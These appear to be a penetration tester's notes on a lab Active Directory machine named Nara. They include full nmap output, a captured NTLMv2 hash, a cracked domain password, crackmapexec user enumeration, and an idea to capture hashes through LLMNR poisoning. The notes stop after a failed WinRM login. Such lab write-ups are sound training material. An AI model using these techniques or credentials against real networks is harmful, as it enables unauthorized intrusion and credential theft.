## NMAP

```
??$ nmap -sC -sV -p- 192.168.53.30 -oA Nara
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 15:47 UTC
Nmap scan report for 192.168.53.30
Host is up (0.00089s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-11 15:49:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2024-08-03T13:19:17
|_Not valid after:  2025-08-03T13:19:17
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2024-08-03T13:19:17
|_Not valid after:  2025-08-03T13:19:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2024-08-03T13:19:17
|_Not valid after:  2025-08-03T13:19:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2024-08-03T13:19:17
|_Not valid after:  2025-08-03T13:19:17
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Not valid before: 2024-05-06T12:45:53
|_Not valid after:  2024-11-05T12:45:53
| rdp-ntlm-info: 
|   Target_Name: NARASEC
|   NetBIOS_Domain_Name: NARASEC
|   NetBIOS_Computer_Name: NARA
|   DNS_Domain_Name: nara-security.com
|   DNS_Computer_Name: Nara.nara-security.com
|   DNS_Tree_Name: nara-security.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-11T15:50:22+00:00
|_ssl-date: 2024-08-11T15:51:02+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-11T15:50:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.92 seconds
```

## SMB

Found share called nara with a documents folder and instructions that documents folder should be checked regularly

[[LLMNR Poisoning]] might work here

Caught hash:

```
[SMB] NTLMv2-SSP Hash     : Tracy.White::NARASEC:2255a1754a67b037:06BB53AA0FB103827EC8D65C2C903FFD:010100000000000080742A0707ECDA01E49DC802690514620000000002000800480037004F00430001001E00570049004E002D003900470049003800460054005900480047005200530004003400570049004E002D00390047004900380046005400590048004700520053002E00480037004F0043002E004C004F00430041004C0003001400480037004F0043002E004C004F00430041004C0005001400480037004F0043002E004C004F00430041004C000700080080742A0707ECDA0106000400020000000800300030000000000000000100000000200000D00848B996F5382F2382D53D9D61634C36DA4130591920B27AB2EADADEB604E30A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00350033000000000000000000
```

Found password by John:

```
zqwj041FGX       (Tracy.White)    
```

Able to enumerate users using crackmapexec smb:

```
SMB         192.168.53.30   445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False)
SMB         192.168.53.30   445    NARA             [+] nara-security.com\Tracy.White:zqwj041FGX 
SMB         192.168.53.30   445    NARA             [+] Enumerated domain user(s)
SMB         192.168.53.30   445    NARA             nara-security.com\Tracy.White                    badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Jemma.Humphries                badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Carolyn.Hill                   badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Jodie.Summers                  badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Declan.Reynolds                badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Jasmine.Roberts                badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Sara.O'Sullivan                badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Helen.Robinson                 badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Damian.Johnson                 badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\Amelia.O'Brien                 badpwdcount: 0 desc:                                 
SMB         192.168.53.30   445    NARA             nara-security.com\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account                                                                      
SMB         192.168.53.30   445    NARA             nara-security.com\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                     
SMB         192.168.53.30   445    NARA             nara-security.com\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain                 
```

Not able to login via evil-winrm

